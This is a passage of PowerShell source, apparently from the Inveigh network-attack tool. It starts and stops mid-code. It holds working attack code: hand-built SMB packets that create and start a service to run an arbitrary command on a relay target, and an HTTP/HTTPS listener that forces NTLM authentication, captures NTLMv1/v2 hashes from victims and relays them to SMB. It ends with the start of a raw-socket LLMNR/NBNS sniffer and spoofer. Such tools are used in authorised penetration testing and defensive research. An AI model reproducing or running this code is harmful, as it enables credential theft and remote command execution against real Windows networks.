                        + (0x03,0x00,0x18,0xff,0x00,0x00,0x00,0x00,0x07,0x00,0x16,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                        + (0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x01,0x00,0x00,0x00)`
                        + (0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x08,0x00,0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00)
                }
                
                2 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x87,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $hash.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x04,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x48,0x00)`
                        + (0x00,0x00,0x48,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x05,0x00,0x0b,0x03,0x10,0x00,0x00,0x00,0x48)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xd0,0x16,0xd0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00)`
                        + (0x01,0x00,0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03,0x02,0x00,0x00)`
                        + (0x00,0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60,0x02,0x00,0x00,0x00)
                        
                        $SMB_multiplex_id = (0x05)
                }
               
                3 { 
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                
                4 {
                    [Byte[]] $SMB_relay_execute_send = (0x00,0x00,0x00,0x8f,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $hash.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x06,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0xea,0x03,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x50)`
                        + (0x00,0x00,0x00,0x50,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x50,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
                        + (0x00,0x50,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x38,0x00,0x00,0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x03)`
                        + (0x00,0x0f,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0f,0x00,0x00,0x00)`
                        + $SMB_machine_bytes`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x3f,0x00,0x0f,0x00)
                        
                        $SMB_multiplex_id = (0x07)
                }
                
                5 {  
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                
                6 {
                    [Byte[]]$SMB_relay_execute_send = [ARRAY](0x00)`
                        + $SMB_service_data_length_bytes`
                        + (0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $hash.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x08,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x9f,0x01,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00)`
                        + $SMB_service_byte_count_bytes`
                        + (0x00,0x00)`
                        + $SMB_service_byte_count_bytes`
                        + (0x3f,0x00,0x00,0x00,0x00,0x00)`
                        + $SMB_service_byte_count_bytes`
                        + (0x05,0x00,0x00,0x03,0x10)`
                        + (0x00,0x00,0x00)`
                        + $SMB_service_byte_count_bytes`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x62,0x01,0x00,0x00,0x00,0x00,0x0c,0x00)`
                        + $SMB_context_handler`
                        + (0x0c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x00,0x00)`
                        + $SMB_service_bytes`
                        + (0x21,0x03,0x03,0x00,0x11,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,0x00)`
                        + $SMB_service_display_bytes`
                        + (0x00,0x00,0xff,0x01,0x0f,0x00,0x10,0x01,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                        + $SMB_relay_command_length_bytes`
                        + (0x00,0x00,0x00,0x00)`
                        + $SMB_relay_command_length_bytes`
                        + $SMB_relay_command_bytes`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
                        
                        $SMB_multiplex_id = (0x09)
                }

                7 {
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                
                8 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x93,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $hash.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x0a,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x9f,0x01,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x54)`
                        + (0x00,0x00,0x00,0x54,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x54,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
                        + (0x00,0x54,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x3c,0x00,0x00,0x00,0x00,0x00,0x10,0x00)`
                        + $SMB_context_handler`
                        + (0x0c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x00,0x00)`
                        + $SMB_service_bytes`
                        + (0xff,0x01,0x0f,0x00)
                        
                        $SMB_multiplex_id = (0x0b)
                }
                
                9 {
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                
                10 {
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x73,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $hash.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x0a,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x9f,0x01,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x34)`
                        + (0x00,0x00,0x00,0x34,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x34,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
                        + (0x00,0x34,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x1c,0x00,0x00,0x00,0x00,0x00,0x13,0x00)`
                        + $SMB_context_handler`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)
                }
                
                11 {
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
                
                12 { 
                    [Byte[]]$SMB_relay_execute_send = (0x00,0x00,0x00,0x6b,0xff,0x53,0x4d,0x42,0x2f,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                        + $hash.process_ID_bytes`
                        + $SMB_user_ID`
                        + (0x0b,0x00,0x0e,0xff,0x00,0x00,0x00,0x00,0x40,0x0b,0x01,0x00,0x00,0xff,0xff,0xff,0xff,0x08,0x00,0x2c)`
                        + (0x00,0x00,0x00,0x2c,0x00,0x3f,0x00,0x00,0x00,0x00,0x00,0x2c,0x00,0x05,0x00,0x00,0x03,0x10,0x00,0x00)`
                        + (0x00,0x2c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0x00,0x00,0x00,0x00,0x00,0x02,0x00)`
                        + $SMB_context_handler
                }
                13 {
                    [Byte[]]$SMB_relay_execute_send = $SMB_relay_execute_ReadAndRequest
                }
            }
            
            $SMB_relay_execute_stream.write($SMB_relay_execute_send, 0, $SMB_relay_execute_send.length)
            $SMB_relay_execute_stream.Flush()
            
            if($SMBRelayNetworkTimeout)
            {
                $SMB_relay_execute_timeout = new-timespan -Seconds $SMBRelayNetworkTimeout
                $SMB_relay_execute_stopwatch = [diagnostics.stopwatch]::StartNew()
                
                while(!$SMB_relay_execute_stream.DataAvailable)
                {
                    if($SMB_relay_execute_stopwatch.elapsed -ge $SMB_relay_execute_timeout)
                    {
                        $hash.console_queue.add("SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")
                        $hash.lof_file_queue.add("$(Get-Date -format 's') - SMB relay target didn't respond within $SMBRelayNetworkTimeout seconds")
                        $hash.SMB_relay_active_step = 0
                        $SMB_relay_socket.Close()
                        break SMB_relay_execute_loop
                    }
                }
            }
            
            if ($k -eq 5) 
            {
                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes, 0, $SMB_relay_execute_bytes.length)
                $SMB_context_handler = $SMB_relay_execute_bytes[88..107]
                
                if($SMB_relay_execute_bytes[108] -eq 0)
                {
                    $hash.console_queue.add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $SMBRelayTarget")
                    $hash.log_file_queue.add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is a local administrator on $SMBRelayTarget")
                    $SMB_relay_failed = $false
                }
                else
                {
                    $hash.console_queue.add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator on $SMBRelayTarget")
                    $hash.log_file_queue.add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string is not a local administrator on $SMBRelayTarget")
                    $hash.SMBRelay_failed_list += "$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string $SMBRelayTarget"
                    $SMB_relay_failed = $true
                }
            }
            elseif (($k -eq 7) -or ($k -eq 11) -or ($k -eq 13))
            {
                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes, 0, $SMB_relay_execute_bytes.length)
                
                switch($k)
                {
                    7 {
                        $SMB_relay_execute_error_message = "Service creation fault context mismatch"
                    }
                    11 {
                        $SMB_relay_execute_error_message = "Service start fault context mismatch"
                    }
                    13 {
                        $SMB_relay_execute_error_message = "Service deletion fault context mismatch"
                    }
                }
                
                if([System.BitConverter]::ToString($SMB_relay_execute_bytes[88..91]) -eq ('1a-00-00-1c'))
                {
                    $hash.console_queue.add("$SMB_relay_execute_error_message service on $SMBRelayTarget")
                    $hash.log_file_queue.add("$(Get-Date -format 's') - $SMB_relay_execute_error on $SMBRelayTarget")
                    $SMB_relay_failed = $true
                }
                else
                {
                    if(!$SMB_relay_failed)
                    {
                        $SMB_relay_failed = $false
                    }
                }
            }
            elseif ($k -eq 9) 
            {
                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes, 0, $SMB_relay_execute_bytes.length)
                $SMB_context_handler = $SMB_relay_execute_bytes[88..107]
                
                if([System.BitConverter]::ToString($SMB_relay_execute_bytes[88..91]) -eq ('1a-00-00-1c')) # need better checks
                {
                    $hash.console_queue.add("Service open fault context mismatch on $SMBRelayTarget")
                    $hash.log_file_queue.add("$(Get-Date -format 's') - Service open fault context mismatch on $SMBRelayTarget")
                    $SMB_relay_failed = $true
                }
            }
            else
            {
                $SMB_relay_execute_stream.Read($SMB_relay_execute_bytes, 0, $SMB_relay_execute_bytes.length)    
            }
            
            if((!$SMB_relay_failed) -and ($k -eq 11))
            {
                $hash.console_queue.add("SMB relay command likely executed on $SMBRelayTarget")
                $hash.log_file_queue.add("$(Get-Date -format 's') - SMB relay command likely executed on $SMBRelayTarget")
            
                if($SMBRelayAutoDisable -eq 'y')
                {
                    $hash.SMB_relay = $false
                    $hash.console_queue.add("SMB relay auto disabled due to success")
                    $hash.log_file_queue.add("$(Get-Date -format 's') - SMB relay auto disabled due to success")
                }
            }
            elseif((!$SMB_relay_failed) -and ($k -eq 13))
            {
                $hash.console_queue.add("SMB relay command execution service deleted on $SMBRelayTarget")
                $hash.log_file_queue.add("$(Get-Date -format 's') - SMB relay command execution service deleted on $SMBRelayTarget")
                }   
            
            [Byte[]]$SMB_relay_execute_ReadAndRequest = (0x00,0x00,0x00,0x37,0xff,0x53,0x4d,0x42,0x2e,0x00,0x00,0x00,0x00,0x18,0x05,0x28)`
                + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x08)`
                + $hash.process_ID_bytes`
                + $SMB_user_ID`
                + $SMB_multiplex_ID`
                + (0x00,0x0a,0xff,0x00,0x00,0x00,0x00,0x40,0x19,0x03,0x00,0x00,0xed,0x01,0xed,0x01,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00)
            
            $k++
        }
        
        $hash.SMB_relay_active_step = 0
        
        $SMB_relay_socket.Close()
        
    }
}

# HTTP/HTTPS Server ScriptBlock - HTTP/HTTPS listener
$HTTP_scriptblock = 
{
     
    param ($HTTP_listener,$SMBRelay,$SMBRelayTarget,$SMBRelayCommand,$SMBRelayUsernames,$SMBRelayAutoDisable,$SMBRelayNetworkTimeout,$Repeat,$ForceWPADAuth)
    
    while ($HTTP_listener.IsListening)
    {
        $hash.context = $HTTP_listener.GetContext() 
        $hash.request = $hash.context.Request
        $hash.response = $hash.context.Response
        $hash.message = ''

        if ($hash.request.Url -match '/stop$') #temp fix to shutdown listener
        {
            $HTTP_listener.stop()
            break
        }
        
        $NTLM = 'NTLM'
        
        if($hash.request.IsSecureConnection)
        {
            $HTTP_type = "HTTPS"
        }
        else
        {
            $HTTP_type = "HTTP"
        }
        
        
        if (($hash.request.RawUrl -match '/wpad.dat') -and ($ForceWPADAuth -eq 'n'))
        {
            $hash.response.StatusCode = 200
        }
        else
        {
            $hash.response.StatusCode = 401
        }
            
        [string]$authentication_header = $hash.request.headers.getvalues('Authorization')
        
        if($authentication_header.startswith('NTLM '))
        {
            $authentication_header = $authentication_header -replace 'NTLM ',''
            [byte[]] $HTTP_request_bytes = [System.Convert]::FromBase64String($authentication_header)
            $hash.response.StatusCode = 401
            
            if ($HTTP_request_bytes[8] -eq 1)
            {
                if(($hash.SMB_relay) -and ($hash.SMB_relay_active_step -eq 0) -and ($hash.request.RemoteEndpoint.Address -ne $SMBRelayTarget))
                {
                    $hash.SMB_relay_active_step = 1
                    $hash.console_queue.add("$HTTP_type to SMB relay triggered by " + $hash.request.RemoteEndpoint.Address + " at $(Get-Date -format 's')")
                    $hash.log_file_queue.add("$(Get-Date -format 's') - $HTTP_type to SMB relay triggered by " + $hash.request.RemoteEndpoint.Address)
                    $hash.console_queue.add("Grabbing challenge for relay from $SMBRelayTarget")
                    $hash.log_file_queue.add("$(Get-Date -format 's') - Grabbing challenge for relay from " + $SMBRelayTarget)
                    $SMB_relay_socket = New-Object System.Net.Sockets.TCPClient
                    $SMB_relay_socket.connect($SMBRelayTarget,"445")
                    
                    if(!$SMB_relay_socket.connected)
                    {
                        $hash.console_queue.add("$(Get-Date -format 's') - SMB relay target is not responding")
                        $hash.lof_file_queue.add("$(Get-Date -format 's') - SMB relay target is not responding")
                        $hash.SMB_relay_active_step = 0
                    }
                    
                    if($hash.SMB_relay_active_step -eq 1)
                    {
                        $SMB_relay_bytes = SMBRelayChallenge $SMB_relay_socket $HTTP_request_bytes
                        $hash.SMB_relay_active_step = 2
                        $SMB_relay_bytes = $SMB_relay_bytes[2..$SMB_relay_bytes.length]
                        $SMB_user_ID = $SMB_relay_bytes[34..33]
                        $SMB_relay_NTLM_challenge = $SMB_relay_bytes[102..109]
                        $SMB_relay_target_details = $SMB_relay_bytes[118..257]
                        $SMB_relay_time = $SMB_relay_bytes[258..265]
                    
                        [byte[]] $HTTP_NTLM_bytes = (0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,0x00,0x00,0x00,0x05,0x82,0x89,0xa2)`
                            + $SMB_relay_NTLM_challenge`
                            + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
                            + $SMB_relay_target_details`
                            + $SMB_relay_time`
                            + (0x00,0x00,0x00,0x00)
                    
                        $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
                        $NTLM = 'NTLM ' + $NTLM_challenge_base64
                        $NTLM_challenge = SMBNTLMChallenge $SMB_relay_bytes
                        $hash.console_queue.add("Received challenge $NTLM_challenge for relay from $SMBRelayTarget")
                        $hash.log_file_queue.add("$(Get-Date -format 's') - Received challenge $NTLM_challenge for relay from $SMBRelayTarget")
                        $hash.console_queue.add("Providing challenge $NTLM_challenge for relay to " + $hash.request.RemoteEndpoint.Address)
                        $hash.log_file_queue.add("$(Get-Date -format 's') - Providing challenge $NTLM_challenge for relay to " + $hash.request.RemoteEndpoint.Address)
                        $hash.SMB_relay_active_step = 3
                    }
                    else
                    {
                        $NTLM = 'NTLM TlRMTVNTUAACAAAABgAGADgAAAAFgomiESIzRFVmd4gAAAAAAAAAAIIAggA+AAAABgGxHQAAAA9MAEEAQgACAAYATABBAEIAAQAQAEgATwBTAFQATgBBAE0ARQAEAB'`
                        + 'IAbABhAGIALgBsAG8AYwBhAGwAAwAkAGgAbwBzAHQAbgBhAG0AZQAuAGwAYQBiAC4AbABvAGMAYQBsAAUAEgBsAGEAYgAuAGwAbwBjAGEAbAAHAAgApMf4tnBy0AEAAAAACgo='
                    }
                }
                else
                {
                    $NTLM = 'NTLM TlRMTVNTUAACAAAABgAGADgAAAAFgomiESIzRFVmd4gAAAAAAAAAAIIAggA+AAAABgGxHQAAAA9MAEEAQgACAAYATABBAEIAAQAQAEgATwBTAFQATgBBAE0ARQAEAB'`
                        + 'IAbABhAGIALgBsAG8AYwBhAGwAAwAkAGgAbwBzAHQAbgBhAG0AZQAuAGwAYQBiAC4AbABvAGMAYQBsAAUAEgBsAGEAYgAuAGwAbwBjAGEAbAAHAAgApMf4tnBy0AEAAAAACgo='
                }
                
                $hash.response.StatusCode = 401
                
            }
            elseif ($HTTP_request_bytes[8] -eq 3)
            {
                $NTLM = 'NTLM'
                $HTTP_NTLM_offset = $HTTP_request_bytes[24]
                $HTTP_NTLM_length = DataLength 22 $HTTP_request_bytes
                $HTTP_NTLM_domain_length = DataLength 28 $HTTP_request_bytes
                $HTTP_NTLM_domain_offset = DataLength 32 $HTTP_request_bytes
                
                if(!$NTLM_challenge)
                {
                    $NTLM_challenge = "1122334455667788"
                }
                        
                if($HTTP_NTLM_domain_length -eq 0)
                {
                    $HTTP_NTLM_domain_string = ''
                }
                else
                {  
                    $HTTP_NTLM_domain_string = DataToString $HTTP_NTLM_domain_length 0 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
                } 
                    
                $HTTP_NTLM_user_length = DataLength 36 $HTTP_request_bytes
                $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_length $HTTP_NTLM_domain_length 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
                        
                $HTTP_NTLM_host_length = DataLength 44 $HTTP_request_bytes
                $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_length $HTTP_NTLM_domain_length $HTTP_NTLM_user_length $HTTP_NTLM_domain_offset $HTTP_request_bytes
        
                if($HTTP_NTLM_length -eq 24) # NTLMv1
                {
                    $NTLM_type = "NTLMv1"
                    $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[($HTTP_NTLM_offset - 24)..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                    $NTLM_response = $NTLM_response.Insert(48,':')
                    $hash.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_response + ":" + $NTLM_challenge
                    
                    if(($NTLM_challenge -ne '') -and ($NTLM_response -ne ''))
                    {    
                        $hash.console_queue.add("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response captured from " + $hash.request.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + "):`n" + $hash.HTTP_NTLM_hash)
                        $hash.log_file_queue.add("$(Get-Date -format 's') - $HTTP_type NTLMv1 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from " + $hash.request.RemoteEndpoint.Address + "(" + $HTTP_NTLM_host_string + ")")
                        $hash.console_queue.add("$HTTP_type NTLMv1 challenge/response written to ")
                        $hash.NTLMv1_file_queue.add($hash.HTTP_NTLM_hash)
                    }
                    
                    if (($hash.IP_capture_list -notcontains $hash.request.RemoteEndpoint.Address) -and (-not $HTTP_NTLM_user_string.EndsWith('$')) -and ($Repeat -eq 'n'))
                    {
                        $hash.IP_capture_list += $hash.request.RemoteEndpoint.Address
                    }
                }
                else # NTLMv2
                {   
                    $NTLM_type = "NTLMv2"           
                    $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[$HTTP_NTLM_offset..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                    $NTLM_response = $NTLM_response.Insert(32,':')
                    $hash.HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLM_response
                    
                    if(($NTLM_challenge -ne '') -and ($NTLM_response -ne ''))
                    {
                        $hash.console_queue.add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response captured from " + $hash.request.RemoteEndpoint.address + "(" + $HTTP_NTLM_host_string + "):`n" + $hash.HTTP_NTLM_hash)
                        $hash.log_file_queue.add($(Get-Date -format 's') + " - $HTTP_type NTLMv2 challenge/response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string captured from " + $hash.request.RemoteEndpoint.address + "(" + $HTTP_NTLM_host_string + ")")
                        $hash.console_queue.add("$HTTP_type NTLMv2 challenge/response written to ")
                        $hash.NTLMv2_file_queue.add($hash.HTTP_NTLM_hash)
                    }
                    
                    if (($hash.IP_capture_list -notcontains $hash.request.RemoteEndpoint.Address) -and (-not $HTTP_NTLM_user_string.EndsWith('$')) -and ($Repeat -eq 'n'))
                    {
                        $hash.IP_capture_list += $hash.request.RemoteEndpoint.Address
                    }
                }
                
                $hash.response.StatusCode = 200
                $NTLM_challenge = ''
                
                if (($hash.SMB_relay) -and ($hash.SMB_relay_active_step -eq 3))
                {
                    if((!$SMBRelayUsernames) -or ($SMBRelayUsernames -contains $HTTP_NTLM_user_string) -or ($SMBRelayUsernames -contains "$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string"))
                    {
                        if($hash.SMBRelay_failed_list -notcontains "$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string $SMBRelayTarget")
                        {
                            if($NTLM_type -eq 'NTLMv2')
                            {
                                $hash.console_queue.add("Sending $NTLM_type response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $SMBRelaytarget")
                                $hash.log_file_queue.add("$(Get-Date -format 's') - Sending $NTLM_type response for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string for relay to $SMBRelaytarget")
                                $SMB_relay_response_return_bytes = SMBRelayResponse $SMB_relay_socket $HTTP_request_bytes $SMB_user_ID
                                $SMB_relay_response_return_bytes = $SMB_relay_response_return_bytes[1..$SMB_relay_response_return_bytes.length]
                    
                                if((!$SMB_relay_failed) -and ([System.BitConverter]::ToString($SMB_relay_response_return_bytes[9..12]) -eq ('00-00-00-00')))
                                {
                                    $hash.console_queue.add("$HTTP_type to SMB relay authentication successful for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $SMBRelayTarget")
                                    $hash.log_file_queue.add("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication successful for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $SMBRelayTarget")
                                    $hash.SMB_relay_active_step = 4
                                    SMBRelayExecute $SMB_relay_socket $SMB_user_ID          
                                }
                                else
                                {
                                    $hash.console_queue.add("$HTTP_type to SMB relay authentication failed for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $SMBRelayTarget")
                                    $hash.log_file_queue.add("$(Get-Date -format 's') - $HTTP_type to SMB relay authentication failed for $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string on $SMBRelayTarget")
                                    $hash.SMBRelay_failed_list += "$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string $SMBRelayTarget"
                                    $hash.SMB_relay_active_step = 0
                                    $SMB_relay_socket.Close()
                                }
                            }
                            else
                            {
                                $hash.console_queue.add("NTLMv1 relay not yet supported")
                                $hash.log_file_queue.add("$(Get-Date -format 's') - NTLMv1 relay not yet supported")
                                $hash.SMB_relay_active_step = 0
                                $SMB_relay_socket.Close()
                            }
                        }
                        else
                        {
                            $hash.console_queue.add("Aborting relay since $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string has already been tried on $SMBRelayTarget")
                            $hash.log_file_queue.add("$(Get-Date -format 's') - Aborting relay since $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string has already been tried on $SMBRelayTarget")
                            $hash.SMB_relay_active_step = 0
                            $SMB_relay_socket.Close()
                        }
                    }
                    else
                    {
                        $hash.console_queue.add("$HTTP_NTLM_domain_string\$HTTP_NTLM_user_string not on relay username list")
                        $hash.log_file_queue.add("$(Get-Date -format 's') - $HTTP_NTLM_domain_string\$HTTP_NTLM_user_string not on relay username list")
                        $hash.SMB_relay_active_step = 0
                        $SMB_relay_socket.Close()
                    }
                }
            }
            else
            {
                $NTLM = 'NTLM'
            }
        
        }
        
        [byte[]] $HTTP_buffer = [System.Text.Encoding]::UTF8.GetBytes($hash.message)
        $hash.response.ContentLength64 = $HTTP_buffer.length
        $hash.response.AddHeader("WWW-Authenticate",$NTLM)
        $HTTP_stream = $hash.response.OutputStream
        $HTTP_stream.write($HTTP_buffer, 0, $HTTP_buffer.length)
        $HTTP_stream.close()
    }
}

# Sniffer/Spoofer ScriptBlock - LLMNR/NBNS Spoofer and SMB sniffer
$sniffer_scriptblock = 
{

    param ($LLMNR_response_message,$NBNS_response_message,$IP,$SpooferIP,$SMB,$LLMNR,$NBNS,$NBNSTypes,$Repeat,$ForceWPADAuth)

    $byte_in = New-Object Byte[] 4	
    $byte_out = New-Object Byte[] 4	
    $byte_data = New-Object Byte[] 4096
    $byte_in[0] = 1  					
    $byte_in[1-3] = 0
    $byte_out[0] = 1
    $byte_out[1-3] = 0
    $sniffer_socket = New-Object System.Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::IP )
    $sniffer_socket.SetSocketOption( "IP", "HeaderIncluded", $true )
    $sniffer_socket.ReceiveBufferSize = 1024000
    $end_point = New-Object System.Net.IPEndpoint( [Net.IPAddress]"$IP", 0 )
    $sniffer_socket.Bind( $end_point )
    [void]$sniffer_socket.IOControl( [Net.Sockets.IOControlCode]::ReceiveAll, $byte_in, $byte_out )

    while($hash.running)
    {
        try
        {
            $packet_data = $sniffer_socket.Receive( $byte_data, 0, $byte_data.length, [Net.Sockets.SocketFlags]::None )
        }
        catch
        {}
    
        $memory_stream = New-Object System.IO.MemoryStream( $byte_data, 0, $packet_data )
        $binary_reader = New-Object System.IO.BinaryReader( $memory_stream )
    
        # IP header fields
        $version_HL = $binary_reader.ReadByte( )
        $type_of_service= $binary_reader.ReadByte( )
        $total_length = DataToUInt16 $binary_reader.ReadBytes( 2 )
        $identification = $binary_reader.ReadBytes( 2 )
        $flags_offset = $binary_reader.ReadBytes( 2 )
        $TTL = $binary_reader.ReadByte( )
        $protocol_number = $binary_reader.ReadByte( )
        $header_checksum = [Net.IPAddress]::NetworkToHostOrder( $binary_reader.ReadInt16() )
        $source_IP_bytes = $binary_reader.ReadBytes( 4 )
        $source_IP = [System.Net.IPAddress]$source_IP_bytes
        $destination_IP_bytes = $binary_reader.ReadBytes( 4 )
        $destination_IP = [System.Net.IPAddress]$destination_IP_bytes
        $IP_version = [int]"0x$(('{0:X}' -f $version_HL)[0])"
        $header_length = [int]"0x$(('{0:X}' -f $version_HL)[1])" * 4
        
        switch($protocol_number)
        {
            6 {  # TCP
                $source_port = DataToUInt16 $binary_reader.ReadBytes(2)
                $destination_port = DataToUInt16 $binary_reader.ReadBytes(2)
                $sequence_number = DataToUInt32 $binary_reader.ReadBytes(4)
                $ack_number = DataToUInt32 $binary_reader.ReadBytes(4)
                $TCP_header_length = [int]"0x$(('{0:X}' -f $binary_reader.ReadByte())[0])" * 4
                $TCP_flags = $binary_reader.ReadByte()
                $TCP_window = DataToUInt16 $binary_reader.ReadBytes(2)
                $TCP_checksum = [System.Net.IPAddress]::NetworkToHostOrder($binary_reader.ReadInt16())
                $TCP_urgent_pointer = DataToUInt16 $binary_reader.ReadBytes(2)    
                $payload_data = $binary_reader.ReadBytes($total_length - ($header_length + $TCP_header_length))
            }       
            17 {  # UDP
                $source_port =  $binary_reader.ReadBytes(2)
                $source_port_2 = DataToUInt16 ($source_port)
                $destination_port = DataToUInt16 $binary_reader.ReadBytes(2)
